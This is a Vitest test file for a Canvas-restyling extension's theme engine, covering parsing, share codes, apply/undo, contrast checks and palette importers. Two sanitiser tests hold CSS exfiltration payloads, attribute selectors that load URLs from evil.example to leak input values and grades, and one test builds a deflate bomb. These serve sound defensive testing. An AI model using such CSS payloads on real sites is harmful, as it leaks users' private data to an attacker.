// Theme engine (src/core/theme): format, map/plan/export, share codes, apply
// with Undo, contrast (floors, HC AAA gate, Fix contrast), presets, importers.
import fs from 'node:fs';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { chromeMock } from './support/chrome.ts';
import { schema } from '../../src/core/registry.ts';
import { createStore, type Flat } from '../../src/core/settings/store.ts';
import {
  EXCLUDED, PRESETS, RICE_PREFIX, THEME_PREFIX, apply, checkPalette, contrastReport, decodeShare, encodeShare, exportTheme, fileName,
  fixContrast, fixTheme, hcFallbackFor, hcGate, importText, parse, plan, preset, revert, toJson, type Theme,
} from '../../src/core/theme/index.ts';
import { fromBase16, fromBetterCanvas, fromCatppuccin, fromPywal, parseSimpleYaml } from '../../src/core/theme/importers.ts';
import { MAP } from '../../src/core/theme/map.ts';
import { isColorRequest } from '../../src/features/card-colors/palettes.ts';

const FIX = path.join(import.meta.dirname, 'fixtures/themes');
const DESIGN = path.join(import.meta.dirname, '../../../design/spec/themes');
const fixture = (f: string) => fs.readFileSync(path.join(FIX, f), 'utf8');
const designTheme = (id: string) => JSON.parse(fs.readFileSync(path.join(DESIGN, `${id}.b2c-theme.json`), 'utf8')) as Theme;
const defaults = (): Flat => Object.fromEntries(Object.entries(schema).map(([k, s]) => [k, s.default]));
const T = (extra: Partial<Theme> = {}): Theme => ({ $b2c: 'theme', v: 1, name: 'Test', ...extra });

beforeEach(() => chromeMock());
afterEach(() => vi.unstubAllGlobals());

describe('parse (theme file v1)', () => {
  it('reads every one of Design\'s preset files cleanly', () => {
    const files = fs.readdirSync(DESIGN).filter(f => f.endsWith('.b2c-theme.json'));
    // Every file is bundled (PRESETS) or deliberately left out (EXCLUDED): presets are built from these files, never copied.
    expect(files.map(f => f.replace('.b2c-theme.json', '')).sort()).toEqual([...PRESETS.map(p => p.id), ...Object.keys(EXCLUDED)].filter(id => files.includes(`${id}.b2c-theme.json`)).sort());
    for (const p of PRESETS) expect(p.theme, p.id).toEqual(JSON.parse(fs.readFileSync(path.join(DESIGN, `${p.id}.b2c-theme.json`), 'utf8')));
    for (const f of files) {
      const r = parse(fs.readFileSync(path.join(DESIGN, f), 'utf8'));
      expect(r.errors, f).toEqual([]);
      expect(r.unknown, f).toEqual([]);
      expect(r.theme?.name, f).toBeTruthy();
    }
  });

  it('rejects what isn\'t a v1 theme, in plain words', () => {
    expect(parse('not json').errors[0]).toMatch(/isn't JSON/);
    expect(parse({ name: 'x' }).errors[0]).toMatch(/isn't a b²c theme/);
    expect(parse({ $b2c: 'theme', v: 2, name: 'x' }).errors[0]).toMatch(/newer b²c/);
    expect(parse({ $b2c: 'theme', name: 'x' }).errors[0]).toMatch(/version/);
    expect(parse({ $b2c: 'theme', v: 1 }).errors[0]).toMatch(/no name/);
    expect(parse({ b2cTheme: 1, name: 'old', parts: {} }).errors[0]).toMatch(/older b²c/);
    for (const bad of [{ name: 'x' }, { $b2c: 'theme', v: 2, name: 'x' }]) expect(parse(bad).theme).toBeNull();
  });

  it('keeps and reports unknown fields at any depth; drops invalid known ones with a reason', () => {
    const r = parse({
      $b2c: 'theme', v: 1, name: ' Mine ', future: { a: 1 }, wallpaper: 'x',
      palette: { dark: { bg: '#ABC', text: 'red', glow: '#123456', link: 'school', bg2: 1 }, sepia: {} },
      shape: { corner: 99, border: 1 }, density: 'airy', cards: { width: 300, colors: { list: ['#fff', 'nope'] } },
      views: { todo: 'ring', cards: 'rows' }, type: { scale: 1.05, family: 'Inter' },
    });
    const t = r.theme!;
    expect(t.name).toBe('Mine');
    expect(t.future).toEqual({ a: 1 });
    expect(t.palette!.dark).toEqual({ bg: '#aabbcc', link: 'school', glow: '#123456', bg2: 1 });
    expect((t.palette as Record<string, unknown>).sepia).toEqual({});
    expect(t.shape).toEqual({ border: 1 });
    expect(t.density).toBeUndefined();
    expect(t.cards).toEqual({ width: 300 });
    expect(t.views).toEqual({ todo: 'ring', cards: 'rows' });
    expect(t.type).toEqual({ scale: 1.05, family: 'Inter' });
    expect(r.unknown.sort()).toEqual(['future', 'palette.dark.bg2', 'palette.dark.glow', 'palette.sepia', 'wallpaper']); // views.cards is known now (card-assignments.view)
    expect(r.errors.join('\n')).toMatch(/palette\.dark\.text: "red" isn't a colour/);
    expect(r.errors.join('\n')).toMatch(/shape\.corner: should be a whole number from 0 to 12/);
    expect(r.errors.join('\n')).toMatch(/density: "airy" isn't one of compact, comfortable, roomy/);
    expect(r.errors.join('\n')).toMatch(/cards\.colors\.list: "nope" isn't a colour/);
  });

  it('only link, accent and nav may be "school"', () => {
    const r = parse(T({ palette: { dark: { bg: 'school', link: 'school', accent: 'school', nav: 'school' } } }));
    expect(r.theme!.palette!.dark).toEqual({ link: 'school', accent: 'school', nav: 'school' });
    expect(r.errors[0]).toMatch(/palette\.dark\.bg/);
  });

  it('caps a theme at 4 KB without its CSS', () => {
    const big = T({ notes: 'x'.repeat(5000) });
    expect(parse(big).errors[0]).toMatch(/at most 4 KB/);
    expect(parse(T({ css: 'a{color:red}\n'.repeat(1000) })).errors).toEqual([]); // CSS has its own cap
  });

  it('always sanitises css, and says what it removed', () => {
    const r = parse(T({ css: 'a{color:red} input[value^="a"]{background:url(https://evil.example/a)}' }));
    expect(r.theme!.css).toBe('a {\n  color: red;\n}\n');
    expect(r.cssRemoved).toHaveLength(1);
    expect(r.cssRemoved[0]!.reason).toMatch(/evil\.example/);
  });

  it('names files after the theme', () => {
    expect(fileName(T({ name: 'Rosé Pine Dawn!' }))).toBe('rose-pine-dawn.b2c-theme.json');
    expect(JSON.parse(toJson(preset('nord')!))).toEqual(designTheme('nord'));
  });
});

describe('plan: theme → setting keys', () => {
  it('keeps every row of the table on keys this build has, or marks it as waiting for one', () => {
    const s = defaults();
    const waiting = MAP.filter(r => !(r.keys[0]! in s)).map(r => r.path);
    expect(waiting.sort()).toEqual(['layout.panel', 'layout.sections']); // type.scale and views.todo have landed
  });

  it('a riced theme fills the dark slot with custom roles and files a course-colour request', () => {
    const p = plan(preset('nord')!, defaults());
    expect(p.values['palette.dark']).toBe('custom');
    expect(p.values['palette.darkRoles']).toEqual(designTheme('nord').palette!.dark);
    expect(p.values['palette.light']).toBeUndefined(); // overrides only what it names
    const req = p.values['card-colors.request'] as { id: string; mode: string; colors: string[] };
    expect(req.mode).toBe('list');
    expect(req.colors).toEqual(designTheme('nord').cards!.colors && (designTheme('nord').cards!.colors as { list: string[] }).list);
    expect(p.courseColors).toEqual({ count: 8, included: true });
    expect(p.notes.some(n => n.path === 'cards.colors' && /in Canvas too/.test(n.text))).toBe(true);
    expect(Object.keys(p.values).sort()).toEqual(['card-colors.request', 'palette.dark', 'palette.darkRoles']);
  });

  it('a theme that is exactly a bundled preset selects the preset by name', () => {
    for (const id of ['dark', 'gray', 'black', 'warm']) {
      const p = plan(preset(id)!, defaults());
      expect(p.values['palette.dark'], id).toBe(id);
      expect(p.values['palette.darkRoles'], id).toBeUndefined();
    }
  });

  it('light themes fill the light slot', () => {
    const p = plan(preset('solarized-light')!, defaults());
    expect(p.values['palette.light']).toBe('custom');
    expect(p.values['palette.lightRoles']).toEqual(designTheme('solarized-light').palette!.light);
    expect(p.values['palette.dark']).toBeUndefined();
  });

  it('the identity theme (Canvas) changes nothing', () => {
    expect(plan(preset('canvas')!, defaults()).values).toEqual({});
  });

  it('maps shape, type, density, cards and layout onto their keys', () => {
    const p = plan(T({
      type: { family: 'Atkinson Hyperlegible', scale: 1.1 }, shape: { corner: 8, border: 2 }, density: 'compact',
      cards: { style: 'gradient', height: 'condensed', overlay: false, width: 300, gap: 20 },
      layout: { width: 'wide', panel: 'left', sections: ['notes', 'todo'] }, views: { todo: 'ring', cards: 'count' },
    }), defaults());
    expect(p.values).toEqual({
      'type.family': 'Atkinson Hyperlegible', 'type.scale': 1.1,
      'shape.corner': 8, 'shape.border': '2', 'type.density': 'compact',
      'gradient-cards.enabled': true, 'condensed-cards.enabled': true, 'card-overlay.overlay': false,
      'card-customization.cardWidth': 300, 'card-customization.cardGap': 20, 'full-width.width': 'wide',
      'better-todo.view': 'ring', 'card-assignments.view': 'count',
    });
    expect(p.notes.filter(n => n.kind === 'skipped').map(n => n.path).sort()).toEqual(['layout.panel', 'layout.sections']);
  });

  it('fonts: a bundled name is used as-is, Canvas default turns the font off, anything else is "Installed"', () => {
    expect(plan(T({ type: { family: 'inter' } }), defaults()).values).toMatchObject({ 'type.family': 'Inter' });
    expect(plan(T({ type: { family: 'Canvas default' } }), defaults()).values).toEqual({ 'type.family': 'Canvas default' });
    expect(plan(T({ type: { family: 'Rubik' } }), defaults()).values).toEqual({ 'type.family': 'Installed', 'type.localFamily': 'Rubik' });
  });

  it('custom CSS needs a yes; with one it replaces hers and turns custom CSS on', () => {
    const t = T({ css: 'a {\n  color: red;\n}\n' });
    const no = plan(t, defaults());
    expect(no.values).toEqual({});
    expect(no.css).toEqual({ lines: 3, bytes: 20, included: false });
    expect(no.notes[0]).toMatchObject({ kind: 'consent', path: 'css' });
    expect(no.notes[0]!.text).toMatch(/custom CSS \(3 lines\)/);
    const yes = plan(t, defaults(), { css: true });
    expect(yes.values).toEqual({ 'custom-css.css': t.css, 'custom-css.enabled': true });
  });

  it('course colours can be left out; a two-stop gradient and a single colour use the existing modes', () => {
    expect(plan(preset('nord')!, defaults(), { courseColors: false }).values['card-colors.request']).toBeUndefined();
    expect(plan(T({ cards: { colors: { gradient: ['#112233', '#445566'] } } }), defaults()).values['card-colors.request']).toMatchObject({ mode: 'gradient', from: '#112233', to: '#445566' });
    expect(plan(T({ cards: { colors: { list: ['#112233'] } } }), defaults()).values['card-colors.request']).toMatchObject({ mode: 'single', color: '#112233' });
  });

  it('says when a slot won\'t show because of "Use dark theme"', () => {
    const s = defaults();
    expect(plan(preset('nord')!, { ...s, 'palette.useDark': 'never' }).notes.some(n => n.path === 'palette.dark' && n.kind === 'info')).toBe(true);
    expect(plan(preset('solarized-light')!, { ...s, 'palette.useDark': 'always' }).notes.some(n => n.path === 'palette.light' && n.kind === 'info')).toBe(true);
  });
});

describe('export and the round trip', () => {
  const riced = (): Flat => ({
    ...defaults(),
    'palette.dark': 'custom', 'palette.darkRoles': designTheme('tokyo-night').palette!.dark,
    'palette.light': 'sepia',
    'type.family': 'JetBrains Mono', 'type.scale': 1.05,
    'shape.corner': 10, 'shape.border': '0', 'type.density': 'roomy',
    'card-assignments.view': 'next', 'better-todo.view': 'week',
    'gradient-cards.enabled': true, 'condensed-cards.enabled': true, 'card-overlay.overlay': false,
    'card-customization.cardWidth': 320, 'card-customization.cardGap': 16, 'full-width.width': 'full',
    'custom-css.enabled': true, 'custom-css.css': '.ic-DashboardCard { outline: 1px solid; }',
  });

  it('reads the look back from the keys (no CSS unless asked)', () => {
    const t = exportTheme(riced(), { name: 'Night', courseColors: ['#AA0000', '#00aa00'] });
    expect(t).toMatchObject({
      $b2c: 'theme', v: 1, name: 'Night',
      type: { family: 'JetBrains Mono', scale: 1.05 }, shape: { corner: 10, border: 0 }, density: 'roomy',
      views: { cards: 'next', todo: 'week' },
      cards: { style: 'gradient', height: 'condensed', overlay: false, width: 320, gap: 16, colors: { list: ['#aa0000', '#00aa00'] } },
      layout: { width: 'full' },
    });
    expect(t.palette!.dark).toEqual(designTheme('tokyo-night').palette!.dark);
    expect(t.palette!.light!.bg).toBe('#f3ead6'); // sepia
    expect(t.css).toBeUndefined();
    expect(exportTheme(riced(), { name: 'x', parts: ['css'] })).toEqual({ $b2c: 'theme', v: 1, name: 'x', css: '.ic-DashboardCard { outline: 1px solid; }' });
    expect(exportTheme(riced(), { name: 'x', parts: ['shape'] })).toEqual({ $b2c: 'theme', v: 1, name: 'x', shape: { corner: 10, border: 0 } });
    expect(exportTheme(defaults(), { name: 'x', parts: ['palette'] }).palette!.light).toBeUndefined(); // Canvas = identity
  });

  it('export → rice code → import → plan reproduces the original keys', async () => {
    const before = riced();
    const t = exportTheme(before, { name: 'Night', parts: ['palette', 'shape', 'type', 'layout', 'views', 'css'] });
    const code = await encodeShare(t, 'rice');
    const back = await importText(code);
    expect(back.kind).toBe('rice');
    expect(back.errors).toEqual([]);
    const p = plan(back.theme!, defaults(), { css: true });
    const after = { ...defaults(), ...p.values };
    const keys = [...new Set([...MAP.flatMap(r => r.keys), 'palette.dark', 'palette.light', 'custom-css.enabled'])].filter(k => k in before);
    for (const k of keys) expect(after[k], k).toEqual(before[k]);
    expect(keys).toEqual(expect.arrayContaining(['card-assignments.view', 'type.family', 'type.scale', 'type.density']));
    // The light slot came back as the Sepia preset itself, not a custom copy.
    expect(p.values['palette.light']).toBe('sepia');
    // Her own CSS survives the sanitiser (it's plain styling).
    expect(after['custom-css.css']).toBe('.ic-DashboardCard {\n  outline: 1px solid;\n}\n');
  });
});

describe('share codes', () => {
  it('a typical theme is well under 1 KB as a code', async () => {
    for (const id of ['nord', 'catppuccin-latte', 'tokyo-night']) {
      const code = await encodeShare(preset(id)!);
      expect(code.startsWith(THEME_PREFIX)).toBe(true);
      expect(code.length, id).toBeLessThan(1024);
    }
    const full = exportTheme({ ...defaults(), 'palette.light': 'custom', 'palette.lightRoles': designTheme('rose-pine-dawn').palette!.light, 'palette.dark': 'custom', 'palette.darkRoles': designTheme('rose-pine').palette!.dark }, { name: 'Rosé Pine, day and night', courseColors: (designTheme('rose-pine').cards!.colors as { list: string[] }).list });
    const code = await encodeShare(full);
    expect(code.length).toBeLessThan(1024);
    expect((await decodeShare(code)).data).toEqual(full);
  });

  it('round-trips, also from a link fragment', async () => {
    const code = await encodeShare(preset('dracula')!);
    expect((await decodeShare(code)).data).toEqual(preset('dracula'));
    expect((await decodeShare(`see https://example.com/t#${code} !`)).data).toEqual(preset('dracula'));
  });

  it('a theme code never carries CSS; a rice code does', async () => {
    const t = T({ css: 'a { color: red; }' });
    const plain = await encodeShare(t);
    expect((await decodeShare(plain)).data).toEqual({ $b2c: 'theme', v: 1, name: 'Test' });
    const rice = await encodeShare(t, 'rice');
    expect(rice.startsWith(RICE_PREFIX)).toBe(true);
    expect((await decodeShare(rice)).data).toEqual(t);
    // A hand-made theme code smuggling CSS: the CSS is dropped, with a note.
    const smuggled = THEME_PREFIX + rice.slice(RICE_PREFIX.length);
    const d = await decodeShare(smuggled);
    expect(d.kind).toBe('theme');
    expect((d.data as Theme).css).toBeUndefined();
    expect(d.notes[0]).toMatch(/can't carry custom CSS/);
  });

  it('refuses damaged codes and deflate bombs in plain words', async () => {
    await expect(decodeShare('b2c-theme:%%%')).rejects.toThrow(/isn't a b²c theme code|damaged/);
    await expect(decodeShare('b2c-theme:AAAA')).rejects.toThrow(/damaged/);
    await expect(decodeShare('hello')).rejects.toThrow(/start with b2c-theme:/);
    const bomb = await encodeShare(T({ x: 'a'.repeat(200_000) }), 'rice');
    expect(bomb.length).toBeLessThan(2000);
    await expect(decodeShare(bomb)).rejects.toThrow(/too big/);
  });
});

describe('apply / undo / revert', () => {
  it('writes the plan in one go, and Undo restores exactly what was there', async () => {
    const store = createStore(schema);
    await store.set({ 'shape.corner': 4, 'palette.dark': 'warm' });
    const t = 0;
    const a = await apply(store, { ...preset('nord')!, shape: { corner: 12 }, cards: { colors: { gradient: ['#112233', '#445566'] } } }, { now: () => t });
    let s = await store.load();
    expect(s['palette.dark']).toBe('custom');
    expect(s['shape.corner']).toBe(12);
    expect((s['card-colors.request'] as { mode: string }).mode).toBe('gradient');
    expect(a.before['shape.corner']).toBe(4);
    expect(await a.undo()).toBe(true);
    s = await store.load();
    expect(s['palette.dark']).toBe('warm');
    expect(s['shape.corner']).toBe(4);
    expect(s['card-colors.request']).toBeNull(); // the pending request is withdrawn
  });

  it('Undo after a tab already wrote the course colours files a revert request', async () => {
    const store = createStore(schema);
    const a = await apply(store, T({ cards: { colors: { gradient: ['#112233', '#445566'] } } }), { now: () => 0 });
    const req = (await store.load())['card-colors.request'] as { id: string };
    await store.set({ 'card-colors.applied': req.id }); // a Canvas tab applied it
    await a.undo();
    expect(((await store.load())['card-colors.request'] as { mode: string }).mode).toBe('revert');
  });

  // Activates by itself once card-colors accepts `list` requests (requested from the Dev lead).
  it.skipIf(!isColorRequest({ id: 'x', mode: 'list', colors: [] } as never))('a course-colour list survives the store (card-colors list mode)', async () => {
    const store = createStore(schema);
    await apply(store, preset('nord')!);
    expect((await store.load())['card-colors.request']).toMatchObject({ mode: 'list', colors: (designTheme('nord').cards!.colors as { list: string[] }).list });
  });

  it('Undo expires after 10 s; revert works any time', async () => {
    const store = createStore(schema);
    let now = 0;
    const a = await apply(store, T({ shape: { corner: 9 } }), { now: () => now });
    now = 11_000;
    expect(await a.undo()).toBe(false);
    expect((await store.load())['shape.corner']).toBe(9);
    await revert(store, a);
    expect((await store.load())['shape.corner']).toBe(2);
  });

  it('applies CSS only with consent', async () => {
    const store = createStore(schema);
    const t = T({ css: 'a {\n  color: red;\n}\n' });
    await apply(store, t);
    expect((await store.load())['custom-css.css']).toBe('');
    await apply(store, t, { css: true });
    expect((await store.load())['custom-css.css']).toBe(t.css);
    expect((await store.load())['custom-css.enabled']).toBe(true);
  });
});

describe('contrast: floors, Fix contrast, and the High Contrast AAA gate', () => {
  const all17 = fs.readdirSync(DESIGN).filter(f => f.endsWith('.b2c-theme.json')).map(f => [f, JSON.parse(fs.readFileSync(path.join(DESIGN, f), 'utf8')) as Theme] as const);

  it('every Design preset passes the floors (as check_themes.py says)', () => {
    for (const [f, t] of all17) {
      const r = contrastReport(t);
      for (const [scheme, rep] of Object.entries(r)) expect(rep.failing.map(c => c.pair), `${f} ${scheme}`).toEqual([]);
    }
  });

  it('every Design preset passes the High Contrast AAA gate', () => {
    let n = 0;
    for (const [f, t] of all17) {
      for (const scheme of ['light', 'dark'] as const) {
        const p = t.palette?.[scheme];
        if (!p) continue;
        n++;
        const g = hcGate(p, scheme, hcFallbackFor(scheme));
        expect(g.failing, `${f} ${scheme}: ${g.checks.filter(c => !c.ok).map(c => `${c.pair} ${c.ratio.toFixed(2)}`).join(', ')}`).toEqual([]);
        expect(g.pass).toBe(true);
      }
    }
    expect(n).toBe(all17.length - 1); // Canvas has no palette
  });

  it('a deliberately weak theme fails the HC gate; its failing roles fall back to Black\'s', () => {
    // Mid-grey text on a lifted surface, a dim tertiary, a pale accent.
    const weak = { bg: '#2a2a2a', surface: '#333333', surfaceRaised: '#3d3d3d', border: '#4a4a4a', text: '#bdbdbd', textSecondary: '#9a9a9a', textTertiary: '#5a5a5a', link: '#7aa2f7', accent: '#cba6f7', nav: '#1a1a1a', navText: '#eeeeee' };
    const g = hcGate(weak, 'dark', hcFallbackFor('dark'));
    expect(g.pass).toBe(false);
    expect(g.failing.sort()).toEqual(['text', 'textTertiary']);
    expect(g.fallback.text).toBe(preset('black')!.palette!.dark!.text);
    expect(g.fallback.textTertiary).toBe(preset('black')!.palette!.dark!.textTertiary);
    expect(g.whole).toBe(false);
    // A light page so washed out that replacing roles can't save it: whole fallback.
    const pale = { bg: '#9a9a9a', surface: '#a0a0a0', surfaceRaised: '#a8a8a8', border: '#888888', text: '#ffffff', textSecondary: '#eeeeee', textTertiary: '#dddddd', link: '#ccddff', accent: '#ffccee', nav: '#888888', navText: '#ffffff' };
    const h = hcGate(pale, 'dark', hcFallbackFor('dark'));
    expect(h.whole).toBe(true);
    expect(h.fallback.bg).toBe('#000000');
  });

  it('Fix contrast reproduces Design\'s hand adjustments exactly (OKLCH lightness only)', () => {
    const cases: [string, 'light' | 'dark', Record<string, string>, string[]][] = [
      ['nord', 'dark', { textTertiary: '#616e88', link: '#88c0d0', accent: '#5e81ac' }, ['#bf616a', '#d08770', '#ebcb8b', '#a3be8c', '#8fbcbb', '#5e81ac', '#81a1c1', '#b48ead']],
      ['catppuccin-mocha', 'dark', { textTertiary: '#9399b2', link: '#89b4fa', accent: '#cba6f7' }, ['#f38ba8', '#fab387', '#f9e2af', '#a6e3a1', '#94e2d5', '#74c7ec', '#89b4fa', '#cba6f7']],
      ['solarized-light', 'light', { text: '#073642', textSecondary: '#586e75', textTertiary: '#657b83', link: '#268bd2', accent: '#6c71c4' }, []],
      ['tokyo-night', 'dark', { text: '#c0caf5', textSecondary: '#a9b1d6', textTertiary: '#737aa2' }, ['#f7768e', '#ff9e64', '#e0af68', '#9ece6a', '#1abc9c', '#7dcfff', '#7aa2f7', '#bb9af7']],
      ['everforest-dark', 'dark', { text: '#d3c6aa', textSecondary: '#9da9a0', textTertiary: '#859289', link: '#7fbbb3', accent: '#a7c080' }, []],
      ['dracula', 'dark', { textTertiary: '#6272a4', accent: '#bd93f9' }, []],
    ];
    for (const [id, scheme, upstream, course] of cases) {
      const shipped = designTheme(id);
      const r = fixContrast({ ...shipped.palette![scheme], ...upstream }, course);
      expect(r.palette, id).toEqual(shipped.palette![scheme]);
      if (course.length) expect(r.courseColors, id).toEqual((shipped.cards!.colors as { list: string[] }).list);
      for (const f of r.fixes) expect(f.why.length).toBeGreaterThan(10);
    }
  });

  it('never moves surfaces, borders, status colours or "school" roles', () => {
    const p = { bg: '#202020', surface: '#2a2a2a', surfaceRaised: '#333333', border: '#3a3a3a', text: '#555555', link: 'school', success: '#003300' };
    const r = fixContrast(p);
    expect(r.palette.bg).toBe(p.bg);
    expect(r.palette.border).toBe(p.border);
    expect(r.palette.link).toBe('school');
    expect(r.palette.success).toBe(p.success);
    expect(checkPalette(r.palette).filter(c => c.role === 'text').every(c => c.ok)).toBe(true);
  });
});

describe('built-in looks', () => {
  it('ships Design\'s presets, minus Gruvbox until its licence is confirmed', () => {
    expect(PRESETS.map(p => p.id)).not.toContain('gruvbox-dark');
    expect(Object.keys(EXCLUDED).sort()).toEqual(['gruvbox-dark', 'gruvbox-light']);
    expect(PRESETS).toHaveLength(19); // + Paper, Sepia, High contrast light and dark (Design, 2026-10-20)
    for (const p of PRESETS) expect(p.theme).toEqual(designTheme(p.id));
  });

  it('every third-party palette has a licence, and the notice names it', () => {
    const notice = fs.readFileSync(path.join(import.meta.dirname, '../../src/core/theme/THEMES-NOTICE.txt'), 'utf8');
    for (const p of PRESETS) {
      const ours = p.theme.author === 'b²c' && !/^https?:/.test(String(p.theme.source));
      if (ours) continue;
      expect(p.licence, p.id).toBeDefined();
      expect(notice).toContain(p.theme.name.replace(' (Night)', ''));
    }
    expect(notice).toContain('Apache License');
    expect(notice).toMatch(/Not included: Gruvbox/);
  });
});

describe('importers (real sample files)', () => {
  it('Better Canvas gallery entry: palette, colours, card look; drops hotlinked images; gradient sidebar → first colour', () => {
    const r = fromBetterCanvas(JSON.parse(fixture('bc-capybara.json')));
    expect(r.theme.name).toBe('Capybara');
    expect(r.theme.author).toBe('ksucpea');
    expect(r.theme.palette!.dark).toEqual({
      bg: '#170d03', surface: '#251c04', surfaceRaised: '#0c0c0c', border: '#1e1e1e', text: '#f5f5f5',
      textSecondary: '#e2e2e2', textTertiary: '#ababab', link: '#dfa581', nav: '#9b5a32', navText: '#f5f5f5',
    });
    expect(r.theme.cards).toEqual({ colors: { list: ['#755215'] }, style: 'flat', overlay: true });
    expect(r.theme.type).toEqual({ family: 'Rubik' });
    expect(r.notes.join('\n')).toMatch(/gradient; b²c uses its first colour, #9b5a32/);
    expect(r.notes.join('\n')).toMatch(/6 card images were left out/);
    expect(r.notes.join('\n')).toMatch(/Google Fonts/);
    expect(parse(r.theme).errors).toEqual([]);
  });

  it('Better Canvas export (bare settings) and a light bc theme', () => {
    const ocean = fromBetterCanvas(JSON.parse(fixture('bc-ocean.json')).exports);
    expect(ocean.theme.palette!.dark!.link).toBe('#56caf0');
    expect(ocean.theme.cards!.style).toBe('gradient');
    const light = fromBetterCanvas(JSON.parse(fixture('bc-light.json')));
    expect(Object.keys(light.theme.palette!)).toEqual(['light']);
  });

  it('base16: tinted (nested, variant) and classic (flat, unquoted hex) shapes', () => {
    const d = fromBase16(fixture('base16-default-dark.yaml'));
    expect(d.theme.name).toBe('Default Dark');
    expect(d.theme.author).toBe('Chris Kempson (http://chriskempson.com)');
    expect(d.theme.palette!.dark).toMatchObject({ bg: '#181818', surface: '#282828', text: '#d8d8d8', link: '#7cafc2', danger: '#ab4642' });
    expect((d.theme.cards!.colors as { list: string[] }).list).toHaveLength(7);
    const l = fromBase16(fixture('base16-default-light.yaml'));
    expect(l.theme.name).toBe('Default Light');
    expect(l.theme.palette!.light).toMatchObject({ bg: '#f8f8f8', text: '#383838', nav: '#181818', navText: '#f8f8f8' });
    expect(() => fromBase16('base00: "000000"')).toThrow(/missing base01/);
    expect(parseSimpleYaml('a: "#123" # c\nb:\n  c: d # e\n# x\n')).toEqual({ a: '#123', b: { c: 'd' } });
  });

  it('Catppuccin palette.json + Fix contrast gives exactly Design\'s bundled Mocha and Latte', () => {
    const pal = JSON.parse(fixture('catppuccin-palette.json'));
    for (const [flavor, id] of [['mocha', 'catppuccin-mocha'], ['latte', 'catppuccin-latte']] as const) {
      const r = fromCatppuccin(pal, { flavor });
      const fixed = fixTheme(r.theme).theme;
      const want = designTheme(id);
      expect(fixed.name).toBe(want.name);
      expect(fixed.palette).toEqual(want.palette);
      expect(fixed.cards).toEqual(want.cards);
    }
    expect(fromCatppuccin(pal, { flavor: 'mocha', accent: 'teal' }).theme.palette!.dark!.accent).toBe('#94e2d5');
    expect(() => fromCatppuccin(pal, { flavor: 'frappe' })).toThrow(/no "frappe" flavour/);
  });

  it('pywal colors.json: real background and foreground, stepped surfaces, a note that roles are guesses', () => {
    const r = fromPywal(JSON.parse(fixture('pywal-colors.json')));
    expect(r.theme.name).toBe('pywal: forest-mist');
    const p = r.theme.palette!.dark!;
    expect(p.bg).toBe('#0f1512');
    expect(p.text).toBe('#c9d3cc');
    expect(p.surface).not.toBe(p.bg);
    expect(r.notes[0]).toMatch(/guess/);
    expect(parse(r.theme).errors).toEqual([]);
  });
});

describe('importText: one entry point for anything pasted or opened', () => {
  it('detects each format', async () => {
    expect((await importText(await encodeShare(preset('nord')!))).kind).toBe('theme');
    expect((await importText(toJson(preset('nord')!))).kind).toBe('theme');
    expect((await importText(fixture('bc-ocean.json'))).kind).toBe('better-canvas');
    expect((await importText(fixture('base16-default-dark.yaml'))).kind).toBe('base16');
    expect((await importText(fixture('catppuccin-palette.json'))).kind).toBe('catppuccin');
    expect((await importText(fixture('pywal-colors.json'))).kind).toBe('pywal');
  });

  it('reports contrast for imports, never fixing silently', async () => {
    const r = await importText(fixture('catppuccin-palette.json'), { flavor: 'mocha' });
    expect(r.theme!.palette!.dark!.textTertiary).toBe('#9399b2'); // as upstream
    expect(r.contrast.dark!.failing.map(c => c.pair)).toContain('textTertiary on surfaceRaised');
  });

  it('a rice file\'s CSS is sanitised on the way in', async () => {
    const r = await importText(JSON.stringify(T({ css: 'body{color:red} [data-grade^="9"]{background:url(//evil.example/9)}' })));
    expect(r.theme!.css).toBe('body {\n  color: red;\n}\n');
    expect(r.cssRemoved).toHaveLength(1);
  });

  it('explains what it can\'t read', async () => {
    expect((await importText('')).errors[0]).toMatch(/Paste a theme code/);
    expect((await importText('hello there')).errors[0]).toMatch(/isn't a theme b²c can read/);
    expect((await importText('{"a":1}')).errors[0]).toMatch(/isn't a theme b²c knows/);
    expect((await importText('b2c-theme:AAAA')).errors[0]).toMatch(/damaged/);
  });
});

describe('contrast: the palette engine\'s stored shapes', () => {
  it('reads "" as derived (school) and never as a failing colour', () => {
    const black = preset('black')!.palette!.dark!;
    const stored = { ...black, link: '', accent: '', nav: '', success: '', warning: '', danger: '' };
    expect(hcGate(stored, 'dark', hcFallbackFor('dark')).pass).toBe(true);
    expect(checkPalette(stored).every(c => c.ok)).toBe(true);
  });
});
